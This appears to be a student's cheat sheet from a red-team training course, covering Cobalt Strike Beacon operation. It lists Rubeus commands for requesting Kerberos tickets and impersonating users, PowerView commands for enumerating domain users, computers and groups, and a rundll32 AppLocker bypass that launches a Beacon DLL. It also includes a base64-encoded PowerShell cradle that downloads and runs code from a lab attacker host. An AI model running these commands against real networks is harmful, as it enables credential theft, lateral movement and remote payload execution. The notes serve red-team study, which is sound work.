```
spawnto x64 %windir%\sysnative\dllhost.exe
spawnto x86 %windir%\syswow64\dllhost.exe
```

```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

List listening bindings
```
run netstat -anp tcp
```

To get beacon to send the info of itself to c2
```
checkin
```

Impersionation with ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ACME /username:username /password:FakePass /ticket:doIFwj[...]MuSU8=
setal_token xxx

```

Import Powerview

```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

Convert SID
```
powershell ConvertFrom-SID
```

Pwshell encode
```
PS C:\> 

$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/c"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))



powershell -w hidden -enc blabla
```

## Recon

[Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38125201-powerview)

### Get-DomainUser
Get users and propierties
```
powershell Get-DomainUser -Properties DisplayName, MemberOf | fl
```


### Get-DomainComputer
Get computers

```
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```

### Get-DomainGroup

Return all domain groups or specific domain group objects.

```
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```

### Get-DomainGPOUserLocalGroupMapping

Enumerate the machines where a specific domain user/group is a member of a specific local group

```
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
```

## Applocker sus

As previously mentioned, DLL enforcement is not commonly enabled which allows us to call exported functions from DLLs on disk via rundll32.  Beacon's DLL payload exposes several exports including DllMain and StartW.  These can be changed in the Artifact Kit under src-main, dllmain.def.

C:\Windows\System32\rundll32.exe http_x64.dll,StartW
